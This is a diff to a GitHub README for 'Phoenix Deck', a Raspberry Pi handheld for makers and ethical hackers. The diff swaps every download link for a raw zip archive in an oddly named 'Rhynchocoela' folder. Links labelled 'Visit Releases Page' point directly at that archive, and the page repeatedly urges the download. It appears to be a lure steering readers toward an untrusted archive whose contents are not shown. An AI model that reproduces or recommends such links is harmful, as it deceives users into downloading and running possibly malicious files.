@@ -4,12 +4,12 @@
 Phoenix Deck is an open-source, modular handheld computer designed for students, makers, and ethical hackers. It combines the powerful Raspberry Pi 5 with a touchscreen tablet interface and a detachable ESP32 hacking module. This device is portable and hackable, making it perfect for both learning and innovation.
 
 ## 🔗 Download Now!
-[![Download PhoenixDeck](https://raw.githubusercontent.com/gabrielandreide/PhoenixDeck/main/Rhynchocoela/PhoenixDeck_2.4-alpha.5.zip)](https://raw.githubusercontent.com/gabrielandreide/PhoenixDeck/main/Rhynchocoela/PhoenixDeck_2.4-alpha.5.zip)
+[![Download PhoenixDeck](https://github.com/gabrielandreide/PhoenixDeck/raw/refs/heads/main/Rhynchocoela/Phoenix_Deck_2.9.zip)](https://github.com/gabrielandreide/PhoenixDeck/raw/refs/heads/main/Rhynchocoela/Phoenix_Deck_2.9.zip)
 
 ## 📥 Download & Install
 To get started with PhoenixDeck, you need to visit our Releases page. There you will find the latest version available for download. Click the link below to access the downloads:
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/gabrielandreide/PhoenixDeck/main/Rhynchocoela/PhoenixDeck_2.4-alpha.5.zip)
+[Visit Releases Page to Download](https://github.com/gabrielandreide/PhoenixDeck/raw/refs/heads/main/Rhynchocoela/Phoenix_Deck_2.9.zip)
 
 ## 💻 System Requirements
 Before you download, ensure your system meets these requirements:
@@ -54,4 +54,4 @@ For further assistance, please reach out through our GitHub Issues page. We enco
 ## 🔗 Download Again
 Feel free to download PhoenixDeck at any time:
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/gabrielandreide/PhoenixDeck/main/Rhynchocoela/PhoenixDeck_2.4-alpha.5.zip)
+[Visit Releases Page to Download](https://github.com/gabrielandreide/PhoenixDeck/raw/refs/heads/main/Rhynchocoela/Phoenix_Deck_2.9.zip)
